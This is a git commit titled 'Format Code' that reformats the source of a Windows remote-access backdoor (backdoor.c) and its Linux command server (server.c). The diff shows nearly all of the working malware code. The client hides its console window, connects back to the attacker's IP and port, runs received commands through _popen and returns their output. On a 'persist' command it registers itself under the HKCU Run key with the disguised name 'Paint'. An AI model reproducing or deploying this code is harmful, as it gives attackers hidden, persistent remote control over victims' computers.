edfe774398f2d96b781a6fcc19f97d49a0225215
chankruze <chankruze@gmail.com>
2020-05-04 20:34:18 +0530

    Format Code
    Signed-off-by: chankruze <chankruze@gmail.com>

--- backdoor.c
+++ backdoor.c
@@ -15,7 +15,7 @@
    containing '\0') to that area.
 **/
 // port bzero in linux for windows (for ease of use)
-#define bzeroWin(p, size) (void) memset((p), 0, (size))
+#define bzeroWin(p, size) (void)memset((p), 0, (size))
 
 //=====================================================================================//
 
@@ -36,115 +36,116 @@ struct sockaddr_in ServAddr;
 void Cmd();
 
 //============ Check & Close Socket on Server Disconnect ============//
-boolean connected(SOCKET sock){
-     char buf;
-     int err = recv(sock, &buf, 1, MSG_PEEK);
-     if(err == SOCKET_ERROR) {
+boolean connected(SOCKET sock) {
+    char buf;
+    int err = recv(sock, &buf, 1, MSG_PEEK);
+    if (err == SOCKET_ERROR) {
         if (WSAGetLastError() != WSAEWOULDBLOCK) {
             closesocket(sock);
             return FALSE;
         }
-     }
-     return TRUE;
+    }
+    return TRUE;
 }
 
 //============ Reconnect to Server ============//
 void reconnect() {
-    // AF_INET represents connection over IPv4 
+    // AF_INET represents connection over IPv4
     // SOCK_STREAM defines TCP connection
     // definition: WINSOCK_API_LINKAGE SOCKET WSAAPI socket(int af, int type, int protocol);
     sock = socket(AF_INET, SOCK_STREAM, 0);
 
-    while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
-		Sleep(30);
-	}
+    while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0) {
+        Sleep(30);
+    }
 
     Cmd();
 }
 
 //============ Cut a string between given indexes  ============//
 char *slice_str(char str[], int slice_from, int slice_to) {
-        if (str[0] == '\0') {
+    if (str[0] == '\0') {
+        return NULL;
+    }
+
+    char *buff;
+    size_t str_len, buffer_len;
+
+    if (slice_to < 0 && slice_from > slice_to) {
+        str_len = strlen(str);
+        if (abs(slice_to) > str_len - 1) {
             return NULL;
         }
-
-        char *buff;
-        size_t str_len, buffer_len;
-
-        if (slice_to < 0 && slice_from > slice_to) {
-                str_len = strlen(str);
-                if (abs(slice_to) > str_len - 1)
-                        return NULL;
-
-                if (abs(slice_from) > str_len)
-                        slice_from = (-1) * str_len;
-
-                buffer_len = slice_to - slice_from;
-                str += (str_len + slice_from);
-
-        } else if (slice_from >= 0 && slice_to > slice_from) {
-                str_len = strlen(str);
-
-                if (slice_from > str_len - 1)
-                        return NULL;
-                buffer_len = slice_to - slice_from;
-                str += slice_from;
-
-        } else {
-            return NULL;
+        if (abs(slice_from) > str_len){
+            slice_from = (-1) * str_len;
         }
 
-        buff = calloc(buffer_len, sizeof(char));
-        strncpy(buff, str, buffer_len);
-        return buff;
+        buffer_len = slice_to - slice_from;
+        str += (str_len + slice_from);
+    } else if (slice_from >= 0 && slice_to > slice_from) {
+        str_len = strlen(str);
+
+        if (slice_from > str_len - 1){
+            return NULL;
+        }
+        
+        buffer_len = slice_to - slice_from;
+        str += slice_from;
+    } else {
+        return NULL;
+    }
+
+    buff = calloc(buffer_len, sizeof(char));
+    strncpy(buff, str, buffer_len);
+    return buff;
 }
 
 //============ run Command on Target Machine & send Response ============//
 void runCmd(char cmd[1024], char (*container)[1024], char (*total_response)[18384]) {
     FILE *fp;
     // Create a pipe and execute a command asynchronously.
-	fp = _popen(cmd, "r");
+    fp = _popen(cmd, "r");
 
     // store first 1024 bytes of resonse in container
     // when response exceeds 1024 bytes, add container to total_resonse
-    while(fgets(*container, 1024, fp) != NULL) {
-		strcat(*total_response, *container);
-	}
+    while (fgets(*container, 1024, fp) != NULL) {
+        strcat(*total_response, *container);
+    }
 
     // send response to server
-	send(sock, *total_response, sizeof(*total_response), 0);
+    send(sock, *total_response, sizeof(*total_response), 0);
     // close file descriptor
-	fclose(fp);
+    fclose(fp);
 }
 
 //============ Edit Registry for Persistance ============//
 int editRegistry() {
-	char err[] = "Failed\n";
-	char suc[] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
-	TCHAR szPath[MAX_PATH]; // 260
+    char err[] = "Failed\n";
+    char suc[] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
+    TCHAR szPath[MAX_PATH]; // 260
     HKEY NewVal;
     DWORD pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
     DWORD pathLenInBytes = pathLen * sizeof(*szPath);
 
-	if (pathLen == 0) {
-		send(sock, err, sizeof(err), 0);
-		return -1;
-	}
+    if (pathLen == 0) {
+        send(sock, err, sizeof(err), 0);
+        return -1;
+    }
 
-	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
-		send(sock, err, sizeof(err), 0);
-		return -1;
-	}
+    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
+        send(sock, err, sizeof(err), 0);
+        return -1;
+    }
 
-	if (RegSetValueEx(NewVal, TEXT("Paint"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
-		RegCloseKey(NewVal);
-		send(sock, err, sizeof(err), 0);
-		return -1;
-	}
+    if (RegSetValueEx(NewVal, TEXT("Paint"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
+        RegCloseKey(NewVal);
+        send(sock, err, sizeof(err), 0);
+        return -1;
+    }
 
-	RegCloseKey(NewVal);
-	send(sock, suc, sizeof(suc), 0);
-	return 0;
+    RegCloseKey(NewVal);
+    send(sock, suc, sizeof(suc), 0);
+    return 0;
 }
 
 //============ Shell ============//
@@ -154,27 +155,26 @@ void Cmd() {
     char total_response[18384];
 
     while (connected(sock)) {
-		bzeroWin(buffer, 1024);
-		bzeroWin(container, sizeof(container));
-		bzeroWin(total_response, sizeof(total_response));
+        bzeroWin(buffer, 1024);
+        bzeroWin(container, sizeof(container));
+        bzeroWin(total_response, sizeof(total_response));
         // receive variables
         recv(sock, buffer, 1024, 0);
 
         // q - quit the connection
         if (strncmp("q", buffer, 1) == 0) {
-			closesocket(sock);
-			WSACleanup();
-			exit(0);
-		} else if (strncmp("cd ", buffer, 3) == 0) {
+            closesocket(sock);
+            WSACleanup();
+            exit(0);
+        } else if (strncmp("cd ", buffer, 3) == 0) {
             // extract directory name leaving "cd "
             chdir(slice_str(buffer, 3, 100));
             runCmd("cd", &container, &total_response);
         } else if (strncmp("persist", buffer, 7) == 0) {
             editRegistry();
-        }
-        else {
+        } else {
             runCmd(buffer, &container, &total_response);
-		}
+        }
     }
 
     reconnect();
@@ -187,7 +187,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
     AllocConsole();
     stealth = FindWindow("ConsoleWindowClass", NULL);
     ShowWindow(stealth, 0);
-    
+
     // setup socket for connection
     unsigned short ServPort;
     char *ServIP;
@@ -203,15 +203,15 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
      * 
      * WSAStartup function initiates use of Winsock DLL by a process.
      **/
-    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
-		exit(1);
-	}
+    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
+        exit(1);
+    }
 
     memset(&ServAddr, 0, sizeof(ServAddr));
     // define params for ServAddr variable
     ServAddr.sin_family = AF_INET;
-	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
-	ServAddr.sin_port = htons(ServPort);
-    
+    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
+    ServAddr.sin_port = htons(ServPort);
+
     reconnect();
 }
--- server.c
+++ server.c
@@ -7,55 +7,55 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
-#define bzeroWin(p, size) (void) memset((p), 0, (size))
+#define bzeroWin(p, size) (void)memset((p), 0, (size))
 #define CONN_AMNT 5
 #define TRUE 1
 
 int main() {
-    int sock, clientSocket;
+	int sock, clientSocket;
 	char buffer[1024];
 	char response[18384];
 	struct sockaddr_in serverAddress, clientAddress;
 	int i = 0, optVal = 1;
-    char *servIP;
-    unsigned short servPort;
+	char *servIP;
+	unsigned short servPort;
 	socklen_t clientLength;
 
-    sock = socket(AF_INET, SOCK_STREAM, 0);
+	sock = socket(AF_INET, SOCK_STREAM, 0);
 
-    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optVal, sizeof(optVal)) < 0) {
+	if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optVal, sizeof(optVal)) < 0) {
 		printf("\nError: Setting TCP Socket Options ;(\n");
 		return 1;
 	}
 
-    servIP = "192.168.43.31";
-    servPort = 50005;
-    serverAddress.sin_family = AF_INET;
+	servIP = "192.168.43.31";
+	servPort = 50005;
+	serverAddress.sin_family = AF_INET;
 	serverAddress.sin_addr.s_addr = inet_addr(servIP);
 	serverAddress.sin_port = htons(servPort);
 
-    bind(sock, (struct sockaddr *) &serverAddress, sizeof(serverAddress));
+	bind(sock, (struct sockaddr *)&serverAddress, sizeof(serverAddress));
 	listen(sock, CONN_AMNT);
-    clientLength = sizeof(clientAddress);
-	clientSocket = accept(sock, (struct sockaddr *) &clientAddress, &clientLength);
+	clientLength = sizeof(clientAddress);
+	clientSocket = accept(sock, (struct sockaddr *)&clientAddress, &clientLength);
 
-    while (TRUE) {
-        bzero(&buffer, sizeof(buffer));
+	while (TRUE) {
+		bzero(&buffer, sizeof(buffer));
 		bzero(&response, sizeof(response));
-        // adaption for windows mchine
-        // bzeroWin(&buffer, sizeof(buffer));
+		// adaption for windows mchine
+		// bzeroWin(&buffer, sizeof(buffer));
 		// bzeroWin(&response, sizeof(response));
 		printf("[%s]-[cmd]~$: ", inet_ntoa(clientAddress.sin_addr));
 		fgets(buffer, sizeof(buffer), stdin);
-        strtok(buffer, "\n");
+		strtok(buffer, "\n");
 		write(clientSocket, buffer, sizeof(buffer));
 
-        if (strncmp("q", buffer, 1) == 0) {
+		if (strncmp("q", buffer, 1) == 0) {
 			break;
-            // WSACleanup();
+			// WSACleanup();
 		} else {
 			recv(clientSocket, response, sizeof(response), MSG_WAITALL);
 			printf("%s", response);
 		}
-    }
+	}
 }
